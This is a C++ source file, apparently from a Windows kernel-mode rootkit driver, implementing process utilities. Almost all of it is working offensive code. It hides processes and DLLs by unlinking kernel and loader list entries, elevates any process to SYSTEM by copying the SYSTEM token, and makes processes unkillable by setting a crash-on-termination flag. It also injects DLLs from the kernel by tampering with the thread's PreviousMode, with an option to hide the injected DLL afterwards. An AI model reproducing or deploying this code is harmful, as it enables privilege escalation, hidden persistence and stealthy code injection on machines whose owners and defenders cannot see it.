#include "ProcessUtils.h"
#include "KernelUtils.h"
#include "MemoryHelper.h"

ULONG TOKEN_OFFSET = 0;
ULONG ACTIVE_PROCESS_LINKS_OFFSET = 0;
ULONG IMAGE_FILE_NAME_OFFSET = 0;
ULONG PSPCIDTABLE_OFFSET = 0;
constexpr SIZE_T THREAD_PREVIOUSMODE_OFFSET = 0x232;

ULONG GetImageFileNameOffset() {
    RTL_OSVERSIONINFOW osVersion = { 0 };
    osVersion.dwOSVersionInfoSize = sizeof(osVersion);

    // Query the OS version
    if (NT_SUCCESS(RtlGetVersion(&osVersion))) {
        // Switch based on the build number and set the offsets accordingly
        switch (osVersion.dwBuildNumber) {
        case 26100: // Windows 11 24H2 
            TOKEN_OFFSET = 0x248;
            ACTIVE_PROCESS_LINKS_OFFSET = 0x1d8;
            IMAGE_FILE_NAME_OFFSET = 0x338;
            PSPCIDTABLE_OFFSET = 0x300;
            break;
            // Only in windows 11 24H2 the offsets changed, it's because i hate microsoft.
            // Default case is when we didnt specify a case for the build number that the PC is using, so we just use the traditional ones.
        case 7601: // Windows 7 latest build
            TOKEN_OFFSET = 0x208;
            ACTIVE_PROCESS_LINKS_OFFSET = 0x188;
            IMAGE_FILE_NAME_OFFSET = 0x2e0;
            break;
        case 3790: // Windows XP Latest builds (SP2) (Includes Windows Server 2003)
            TOKEN_OFFSET = 0x160;
            ACTIVE_PROCESS_LINKS_OFFSET = 0xe0;
            IMAGE_FILE_NAME_OFFSET = 0x268;
            break;
        default: // Just use them default ones.
            TOKEN_OFFSET = 0x4b8;
            ACTIVE_PROCESS_LINKS_OFFSET = 0x448;
            IMAGE_FILE_NAME_OFFSET = 0x5a8;
            break;
        }
        return osVersion.dwBuildNumber;
    }
    else {
        return 0;
    }
}

VOID FlinkBlinkHide(PLIST_ENTRY Current) {
    PLIST_ENTRY Prev, Next;

    // Get the previous and next list entries from the current entry
    Prev = (Current->Blink);
    Next = (Current->Flink);

    // Unlink the current entry from the list:
    // 1. Set the previous entry's Flink (forward link) to the point of the next entry
    Prev->Flink = Next;
    // 2. Set the next entry's Blink (Backwards Link) to point to the previous entry
    Next->Blink = Prev;
    // We now have hidden the current entry.

    // To avoid a crash (BSOD) due to dangling pointers, rewrite the current entry's pointers so that they refer to itself.
    // This makes it an isolated circular list.
    Current->Blink = (PLIST_ENTRY)&Current->Flink;
    Current->Flink = (PLIST_ENTRY)&Current->Flink;
    return;
}

int ProcessUtils::ProtectProcess(UINT32 PID) {
        if (GetImageFileNameOffset() == 0) {
            DbgPrint("[!-!] Build number unknown, returning from ProtectProcess.\n");
            return STATUS_UNSUCCESSFUL;
        }
        NTSTATUS status = STATUS_SUCCESS;
        CLIENT_ID clientId;
        HANDLE hProcess;
        OBJECT_ATTRIBUTES objAttr;
        ULONG BreakOnTermination = 1;
        ULONG check;
        clientId.UniqueThread = NULL;
        clientId.UniqueProcess = UlongToHandle(PID);
        InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

        status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
        if (status == STATUS_UNSUCCESSFUL) {
            DbgPrint("[-] Failed to open process to use on ProtectProcess, returning.\n");
            return status;
        }
        status = ZwQueryInformationProcess(hProcess, ProcessBreakOnTermination, &check, sizeof(ULONG), 0);
        if (!NT_SUCCESS(status)) {
            return 2;
        }
        // process is already protected with BreakOnTermination.
        if (check == 1) {
            return 0;
        }
        status = ZwSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
        if (status == STATUS_UNSUCCESSFUL) {
            DbgPrint("[-] Failed to set process information to use on ProtectProcess, returning.\n");
            return status;
        }
        DbgPrint("[+] Process with PID: %d is now protected using BreakOnTermination flag, termination will cause a blue screen, restart computer or use the UnProtectProcess function to revert\n", PID);
        return 1;
}

int ProcessUtils::UnProtectProcess(UINT32 PID) {
        if (GetImageFileNameOffset() == 0) {
            DbgPrint("[!-!] Build number unknown, returning from ProtectProcess.\n");
            return STATUS_UNSUCCESSFUL;
        }
        NTSTATUS status = STATUS_SUCCESS;
        CLIENT_ID clientId;
        HANDLE hProcess;
        OBJECT_ATTRIBUTES objAttr;
        ULONG BreakOnTermination = 0; // Now it's 0 because we want to revert changes.
        ULONG check;
        clientId.UniqueThread = NULL;
        clientId.UniqueProcess = UlongToHandle(PID);
        InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

        status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
        if (status == STATUS_UNSUCCESSFUL) {
            // Failure here means we will not open to modify the information of the process.
            DbgPrint("[-] Failed to open process to use on UnProtectProcess, returning.\n");
            return status;
        }
        status = ZwQueryInformationProcess(hProcess, ProcessBreakOnTermination, &check, sizeof(ULONG), 0);
        if (check == 0) {
            return 0;
        }
        status = ZwSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
        if (status == STATUS_UNSUCCESSFUL) {
            // Failure here means the process will stay protected, mitigating the function.
            DbgPrint("[-] Failed to set process information to use on UnProtectProcess, returning.\n");
            return status;
        }
        DbgPrint("[+] Process with PID: %d is no longer protected, termination will not result a blue screen.\n", PID);
        return 1;
}

// Function to extract only filenames from the fullpath - example: C:\Users\matanel\Desktop\file.exe TO file.exe
WCHAR* ExtractFileName(const WCHAR* fullPath) {
    // Find the last backslash.
    const WCHAR* lastSlash = wcsrchr(fullPath, L'\\');
    // If the backslash is NOT NULL (which means that it exists), it will point to the next letter (which is the start of the filename), and truncate everything behind it so only the filename is left.
    return lastSlash ? (WCHAR*)(lastSlash + 1) : (WCHAR*)fullPath;
}

int ProcessUtils::HideDLL(UINT32 PID, const WCHAR* DLLName) {
        // Get the build numbers and offsets if needed to be used here.
        if (GetImageFileNameOffset() == 0) {
            DbgPrint("[!-!] Build number unknown, returning from ProtectProcess.\n");
            return STATUS_UNSUCCESSFUL;
        }   
        // Check if the DLLName address is valid, to avoid bsods.
        if (!DLLName || !MmIsAddressValid((PVOID)DLLName)) {
            DbgPrint("[!] Invalid DLL name pointer\n");
            return 9999;
        }
        // Debug prints, used to fix the function.
        DbgPrint("[+] DLLName supplied by client: %ws\n", DLLName);
        DbgPrint("[+] HideDLL function called.\n");

        // Add validation for DLL name format
        size_t dllNameLen = wcslen(DLLName);
        if (dllNameLen < 5) { // Minimum "x.dll"
            DbgPrint("[!] DLL name too short\n");
            return 9999;
        }
        // Initilizations.
        PVOID moduleBase;
        KAPC_STATE state;
        PLDR_DATA_TABLE_ENTRY entry = nullptr;  // Initialize to nullptr
        NTSTATUS status;
        int check = -1;
        LARGE_INTEGER time = { 0 };
        time.QuadPart = -10011 * 10 * 1000;
        // Get the PEB structure of the Process using it's PID and undocumented functions.
        PEPROCESS pTargetProcess;
        // First get EPROCESS of process.
        status = PsLookupProcessByProcessId(UlongToHandle(PID), &pTargetProcess);
        if (status != STATUS_SUCCESS) {
            DbgPrint("[-] Failed to get EPROCESS of PID, aborting HideDLL function.\n");
            return 9999;
        }
        // Attach the kernel current thread to the process paged memory thread, to modify it's memory (since windows uses Virtual Pages for memory).
        KeStackAttachProcess(pTargetProcess, &state);
        // Get it's PEB.
        PREALPEB PEB = (PREALPEB)PsGetProcessPeb(pTargetProcess);
        // Checks.
        if (!PEB) {
            DbgPrint("[-] Failed to get PEB of target process, aborting HideDLL function.\n");
            KeUnstackDetachProcess(&state);
            ObDereferenceObject(pTargetProcess);
            return 9999;
        }
        // Now we wait until the PEB LoaderData (LDR) is available to start traversing.
        for (int i = 0; !PEB->LoaderData && i < 10; i++) {
            KeDelayExecutionThread(KernelMode, FALSE, &time);
        }
        // More checks.
        if (!PEB->LoaderData) {
            DbgPrint("[-] Failed to get LDR (Loader Data) of target process's PEB, aborting HideDLL function.\n");
            KeUnstackDetachProcess(&state);
            ObDereferenceObject(pTargetProcess);
            return 9999;
        }
        if (!&PEB->LoaderData->InLoadOrderModuleList) {
            DbgPrint("[-] Failed to get loaded DLL list (LoadedModuleList) inside of LoaderData, aborting HideDLL function.\n");
            KeUnstackDetachProcess(&state);
            ObDereferenceObject(pTargetProcess);
            return 9999;
        }
        // Enumerate the DLL's inside of the process to find our requested DLL.
        // Basically move through all DLL's in the doubly linked list.
        status = STATUS_NOT_FOUND; // Base status, that it is not found when we for loop the whole thing, so later we can check if found to do more stuff.
        for (PLIST_ENTRY pListEntry = PEB->LoaderData->InLoadOrderModuleList.Flink;
            pListEntry != &PEB->LoaderData->InLoadOrderModuleList; // Not equal to the first entry, so if it is equal we got all of the linked list.
            pListEntry = pListEntry->Flink) {
            // Get the address of the InLoadOrderLinks.
            entry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
            if (entry && entry->FullDllName.Length > 0) {
                WCHAR dllNameBuffer[256];
                // Copy the buffer of the FullDllName safely to the variable.
                wcsncpy_s(dllNameBuffer, entry->FullDllName.Buffer, entry->FullDllName.Length / sizeof(WCHAR));
                // Null-Terminate it.
                dllNameBuffer[entry->FullDllName.Length / sizeof(WCHAR)] = L'\0';
                // Extract just the filename from the full path
                const WCHAR* entryFileName = ExtractFileName(dllNameBuffer);

                // Compare filenames case-insensitively
                if (_wcsicmp(entryFileName, DLLName) == 0) {
                    DbgPrint("[+] Found matching DLL, unlinking from lists\n");
                    moduleBase = entry->DllBase;
                    // If found, start unlinking from the doubly-lined list.
                    FlinkBlinkHide(&entry->InLoadOrderLinks);
                    FlinkBlinkHide(&entry->InInitializationOrderLinks);
                    FlinkBlinkHide(&entry->InMemoryOrderLinks);
                    FlinkBlinkHide(&entry->HashLinks);
                    status = STATUS_SUCCESS;
                    break;
                }

                // Updated debug logging to show actual comparison
                DbgPrint("DEBUG: Comparing DLL filename: %ws with Target: %ws\n", entryFileName, DLLName);
            }
        }
        if (status == STATUS_SUCCESS) {
            // Zero out the DLLBase
            moduleBase = nullptr;
            RtlZeroMemory(entry->FullDllName.Buffer, sizeof(entry->FullDllName.Buffer));
            RtlZeroMemory(entry->BaseDllName.Buffer, sizeof(entry->BaseDllName.Buffer));
            DbgPrint("[+] Successfully hidden the DLL from the process!\n");
            check = 1;
        }
        else {
            DbgPrint("[-] Status is not STATUS_SUCCESS in HideDLL function.\n");
            // Only print debug info if entry is valid
            if (entry && MmIsAddressValid(entry)) {
                WCHAR dllnamefull[256];
                wcsncpy_s(dllnamefull, entry->FullDllName.Buffer, entry->FullDllName.Length / sizeof(WCHAR));
                dllnamefull[entry->FullDllName.Length / sizeof(WCHAR)] = L'\0'; // Null-terminate
                DbgPrint("DEBUG: FullDllName.buffer: %ws", dllnamefull);
                WCHAR dllnameinloop[256];
                wcsncpy_s(dllnameinloop, entry->FullDllName.Buffer, entry->FullDllName.Length / sizeof(wchar_t) - 4);
                DbgPrint("DEBUG: FullDllName.buffer INLOOP: %ws", dllnameinloop);
                check = 0;
            }
        }
        // Detach from the process's memory.
        KeUnstackDetachProcess(&state);
        ObDereferenceObject(pTargetProcess); // Cleanup - Always remember to cleanup, we don't want memory leaks.
        DbgPrint("[*] Exiting HideDLL Function.\n");
        if (check == 1) {
            return 1;
        }
        else if (check == 0) {
            return 0;
        }
        return 9999;
}

int ProcessUtils::HideProcess(UINT32 PID) {
        if (GetImageFileNameOffset() == 0) {
            DbgPrint("[!-!] Build number unknown, returning from ProtectProcess.\n");
            return STATUS_UNSUCCESSFUL;
        }
        DbgPrint("[+] HideProcess function called.\n");

        /* NOTE: A better implementation of mine here is to just use PsLookupProcessByProcessId, to get it's EPROCESS, and then just hide it :) */

        // Assume ACTIVE_PROCESS_LINKS_OFFSET is the offset to the process ID within the EPROCESS struct.
        // Here, PID_OFFSET is set to that offset.
        ULONG PID_OFFSET = ACTIVE_PROCESS_LINKS_OFFSET;
        ULONG LIST_OFFSET = PID_OFFSET;
        // The code uses an INT_PTR variable to adjust LIST_OFFSET
        // Essentially, LIST_OFFSET is advanced by the size of the pointer itself (likely 8 bytes)
        INT_PTR ptr;
        int check = -1;
        LIST_OFFSET += sizeof(ptr);

        // Get the current process (starting point to start traversing)
        PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();

        // Calculate the pointer to the current process's ActiveProcessList list entry.
        PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);

        // Calculate the address of the current pointer PID field. (basically, gets his PID from within the current EPROCESS structure, using the known offset.)
        PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);

        // First check if this current process, is the one we want to hide (by checking its pid using CurrentPID)
        if (*(UINT32*)CurrentPID == PID) {
            // If the current process PID is the one we want to hide, the hide it by unlinking it from its list entry.
            FlinkBlinkHide(CurrentList);
            DbgPrint("[+] Process is now hidden.\n");
            check = 1;
        }
        // Otherwise, we set a starting point to start looping.
        PEPROCESS StartProcess = CurrentEPROCESS;


        // Move to the next process in the list.
        // The next process's EPROCESS is computed by taking the pointer from CurrentList->Flink
        // then subtracting LIST_OFFSET to get back to the base of the EPROCESS structure.
        CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
        CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
        CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);


        // Traverse the process list until we circle back to the starting process (looping)
        while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS) {
            // If the current process PID in the loop matches the one we want to hide, we unlink it from the list.
            if (*(UINT32*)CurrentPID == PID) {
                FlinkBlinkHide(CurrentList);
                DbgPrint("[+] Process is now hidden.\n");
                check = 1;
                break;
            }

            // Move to the next process: adjust the pointer based on the list entry.
            CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
            CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
            CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
        }
        // Return the result.
        DbgPrint("[*] Returning from function HideProcess.\n");
        if (check == 1) {
            return 1;
        }
        return 9999;
}

int ProcessUtils::ElevateProcess(UINT32 PID) {
        if (GetImageFileNameOffset() == 0) {
            DbgPrint("[!-!] Build number unknown, returning from ProtectProcess.\n");
            return STATUS_UNSUCCESSFUL;
        }
        DbgPrint("[+] Starting to elevate process %u.\n", PID);
        int check;
        NTSTATUS status = STATUS_SUCCESS;
        PEPROCESS pTargetProcess, pSystemProcess;
        ULONG srcPid = 4; // PID 4 Is the "SYSTEM" Process, it is the most privileged process, handles hardware and software interaction, runs in kernel mode, we use it to dominate the world!

        // Lookup the eprocess addr from the dstPid (PID) (The one the user wants to elevate)
        status = PsLookupProcessByProcessId(ULongToHandle(PID), &pTargetProcess);
        if (status != STATUS_SUCCESS) {
            DbgPrint("[-] Target PID PsLookup failed.\n");
            return status;
        }

        DbgPrint("[+] Target EProcess address: 0x%p\n", pTargetProcess);

        // Lookup the eprocess addr from the srcpid (system process)
        status = PsLookupProcessByProcessId(ULongToHandle(srcPid), &pSystemProcess);

        if (status != STATUS_SUCCESS) {
            // What the hell?
            DbgPrint("[!] Failed to lookup the source process PsLookup, this is a major error, since it's the SYSTEM process.\n");
            return status;
        }

        DbgPrint("[+] Source EProcess address: 0x%p\n", pSystemProcess);
        DbgPrint("[+] Setting source (SYSTEM) token to the target token\n");

        // Perform token stealing, overwrite the target process token with the SYSTEM process token.
        // This is done by copying the token pointer from the SYSTEM process's EPROCESS structure
        // to the target process's EPROCESS structure, using the current latest known offset, which is defined as 0x4b8
        __try {
            // cast the pointer to an unsigned 8 byte address (UINT64), treat it as a pointer to a UINT64, and dereference it to get the value and add the token offset, same thing to the right side.
            *(UINT64*)((UINT64)pTargetProcess + (UINT64)TOKEN_OFFSET) = *(UINT64*)(UINT64(pSystemProcess) + (UINT64)TOKEN_OFFSET); // Now the token pointer for the target pid is now the SYSTEM's one, essentially copying it.
            DbgPrint("--------------------------------------------------------\n");
            DbgPrint("[+] Successfully elevated process using SYSTEM token.\n");
            DbgPrint("--------------------------------------------------------\n");
            check = 1;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[!] Exception occured during token stealing.\n");
            check = 0;
            status = GetExceptionCode();
        }

        // Cleanup
        ObDereferenceObject(pSystemProcess);
        ObDereferenceObject(pTargetProcess);
        if (check == 1) {
            return 1;
        }
        else if (check == 0) {
            return 0;
        }
        return status;
}

int ProcessUtils::InjectDLL(WCHAR* path, UINT32 PID, bool stealth) {
    // its 1am btw, no explanations unless edited on by future me :)
    // since we are using LABELS and GOTO this time, we must init all variables before calling the goto keyword, idk why.
    if (PID < 4) {
        return STATUS_INVALID_CID;
    }
    DbgPrint("[*] InjectDLL Called.\n");

    NTSTATUS status;
    PEPROCESS process;
    KAPC_STATE state;
    bool failure = false;
    SIZE_T sizeOfDLLPath = (wcslen((PCWSTR)path) + 1) * sizeof(WCHAR);
    PVOID baseAddr = nullptr;
    CLIENT_ID cid = { 0 };
    cid.UniqueProcess = UlongToHandle(PID);
    cid.UniqueThread = NULL;
    HANDLE hThread = NULL;
    PVOID kernel32;
    PVOID LoadLibraryW;
    HANDLE hProcess = NULL;
    //PCHAR prevMode;
    ULONG oldProtection;
    //-CHAR prevModetmp;
    UNICODE_STRING funcName;

    // resolve NtCreateThreadEx
    RtlInitUnicodeString(&funcName, L"NtCreateThreadEx");
    // this used to be MmGetSystemRoutineAddress, and I didn't get why I got access violations each time I ran NtCreateThreadEx - turns out it is not exported from ntoskrnl, so MmGetSystemRoutineAddress is useless.
    tNtCreateThreadEx NtCreateThreadEx = (tNtCreateThreadEx)
        KernelUtils::GetSSDTFunctionAddress("NtCreateThreadEx");

    // init objattr to apply a valid kernel handle.
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

    // get the process's EPROCESS ptr.
    status = PsLookupProcessByProcessId(UlongToHandle(PID), &process);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[!] Failed to get EPROCESS of PID: %d | STATUS: 0x%08X\n", PID, status);
        return STATUS_NOT_FOUND;
    }
    // attach to the process thread virtual memory context.
    KeStackAttachProcess(process, &state);

    // open a handle to the target process
    status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Couldn't open process with PID: %d | STATUS: 0x%08X\n", PID, status);
        failure = true;
    }

    // get our kernel32.dll
    DbgPrint("[+] Resolving kernel32.dll base...\n");
    kernel32 = MemoryHelper::GetModuleBase(process, L"kernel32.dll");
    if (!kernel32 || !MmIsAddressValid(kernel32)) {
        // couldn't find kernel32, like why are those if statements necessary, in what world kernel32 isn't attached to a process unless it's detached by the process, or it's a system process. - we still gotta check tho :)
        DbgPrint("[!] Couldn't find Kernel32.dll base on PID: %d\n", PID);
        failure = true;
    }
    DbgPrint("[+] kernel32.dll base: %p\n", kernel32);

    // resolve LoadLibraryW address
    DbgPrint("[+] Resolving LoadLibraryW address...\n");
    LoadLibraryW = MemoryHelper::GetProcAddress(kernel32, "LoadLibraryW");
    if (!LoadLibraryW) {
        DbgPrint("[!] LoadLibraryW address not found\n");
        ZwClose(hProcess);
        KeUnstackDetachProcess(&state);
        ObDereferenceObject(process);
        return STATUS_NOT_FOUND;
    }

    // allocate memory in target
    DbgPrint("[+] Allocating %zu bytes in target...\n", sizeOfDLLPath);
    status = ZwAllocateVirtualMemory(
        hProcess,
        &baseAddr,
        0,
        &sizeOfDLLPath,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        DbgPrint("[!] Failed to allocate virtual memory on PID: %d | STATUS: 0x%08X\n", PID, status);
        failure = true;
    }
    DbgPrint("[+] Allocated Virtual Memory on PID: %d at %p\n", PID, baseAddr);

    // make remote region writable
    if (!failure) {
        status = ZwProtectVirtualMemory(
            hProcess,
            &baseAddr,
            &sizeOfDLLPath,
            PAGE_READWRITE,
            &oldProtection
        );
        DbgPrint("[*] ZwProtectVirtualMemory -> 0x%08X, baseAddr=%p, size=%zu\n",
            status, baseAddr, sizeOfDLLPath);
        if (!NT_SUCCESS(status)) {
            DbgPrint("[-] Failed to un-protect virtual memory on PID: %d | STATUS: 0x%08X\n",
                PID, status);
            failure = true;
        }
    }

    // copy the dll path into the newly allocated memory.
    if (!failure) {
        DbgPrint("[+] Writing DLL path to remote memory at %p\n", baseAddr);
        RtlCopyMemory(baseAddr, path, sizeOfDLLPath);
    }

    // restore original protection
    if (!failure) {
        status = ZwProtectVirtualMemory(
            hProcess,
            &baseAddr,
            &sizeOfDLLPath,
            oldProtection,
            &oldProtection
        );
        DbgPrint("[*] ZwProtectVirtualMemory(restore) -> 0x%08X, baseAddr=%p, size=%zu\n",
            status, baseAddr, sizeOfDLLPath);
        if (!NT_SUCCESS(status)) {
            DbgPrint("[-] Failed to re-protect process memory on PID: %d | STATUS: 0x%08X\n",
                PID, status);
            failure = true;
        }
    }

    // create a suitable thread to queue loadlibrary in.
    /*
    ---------
    implement a stealth version, APC Is stealhier for sure, manual mapping is also very very stealthy, imagine they hook LoadLibraryW, this is useless then.
    ---------
    */
    if (!failure) {
        __try {
            DbgPrint("[+] Initializing Object Attributes.\n");
            InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
            PCHAR prevMode = (PCHAR)((PUCHAR)PsGetCurrentThread() + THREAD_PREVIOUSMODE_OFFSET); // PETHREAD is KTHREAD, didn't understand why I didn't find the offset in vergilius.
            CHAR tmpMode = *prevMode;
            *prevMode = KernelMode;
            DbgPrint("[+] Calling NtCreateThreadEx.\n");
            status = NtCreateThreadEx(
                &hThread,
                THREAD_ALL_ACCESS,
                &objAttr,
                hProcess,
                (PTHREAD_START_ROUTINE)LoadLibraryW,
                baseAddr,
                0,
                NULL, NULL, NULL, NULL
            );
            *prevMode = tmpMode;
            //RtlSecureZeroMemory((VOID*)tmpMode, sizeof(CHAR));

            if (!NT_SUCCESS(status)) {
                // FIXME -- why didn't it create the thread?
                DbgPrint("[!] Failed to CALL NtCreateThreadEx, STATUS: 0x%08X\n", status);
                failure = true;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) { DbgPrint("[!] Exception in executing __try, STATUS: %d\n", status); }
    }

    // detach and cleanup
    DbgPrint("[+] Finished with creating the thread, cleaning up.\n");
    KeUnstackDetachProcess(&state);
    if (baseAddr && MmIsAddressValid(baseAddr)) {
        ZwFreeVirtualMemory(hProcess, &baseAddr, &sizeOfDLLPath, MEM_DECOMMIT);
    }
    if (hProcess) {
        ZwClose(hProcess);
    }
    if (process) {
        ObDereferenceObject(process);
    }
    if (hThread) {
        ZwClose(hThread);
    }

    if (failure) {
        DbgPrint("[-] Failure on InjectDLL\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    if (stealth) {
        DbgPrint("[+] Stealth boolean is enabled, calling HideDLL.");
        WCHAR* filename = ExtractFileName(path);
        HideDLL(PID, filename);
        DbgPrint("[+] Finished with InjectDLL, returning.\n");
        return STATUS_SUCCESS_WITH_STEALTH;
    }

    DbgPrint("[+] Finished with InjectDLL, returning.\n");
    return STATUS_SUCCESS;
}

NTSTATUS ProcessUtils::FindPidByName(const wchar_t* processName, ULONG* pid) {
    NTSTATUS status = STATUS_SUCCESS;
    PSYSTEM_PROCESS_INFO originalInfo = NULL;
    PSYSTEM_PROCESS_INFO info = NULL;
    ULONG infoSize = 0;

    if (!pid || !processName)
        return STATUS_INVALID_PARAMETER;

    status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);

    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        if (originalInfo)
            ExFreePoolWithTag(originalInfo, DRIVER_TAG);
        originalInfo = MemoryHelper::AllocateMemory<PSYSTEM_PROCESS_INFO>(infoSize);

        if (!originalInfo)
            break;
        status = ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
    }

    if (!NT_SUCCESS(status) || !originalInfo) {
        if (!originalInfo)
            status = STATUS_INSUFFICIENT_RESOURCES;
        else
            ExFreePoolWithTag(originalInfo, DRIVER_TAG);
        return status;
    }

    // Using another info variable to avoid BSOD on freeing.
    info = originalInfo;

    // Iterating the processes information until our pid is found.
    while (info->NextEntryOffset) {
        if (info->ImageName.Buffer && info->ImageName.Length > 0) {
            if (_wcsicmp(info->ImageName.Buffer, processName) == 0) {
                *pid = HandleToULong(info->UniqueProcessId);
                break;
            }
        }
        info = (PSYSTEM_PROCESS_INFO)((PUCHAR)info + info->NextEntryOffset);
    }

    if (originalInfo)
        ExFreePoolWithTag(originalInfo, DRIVER_TAG);
    return status;
}

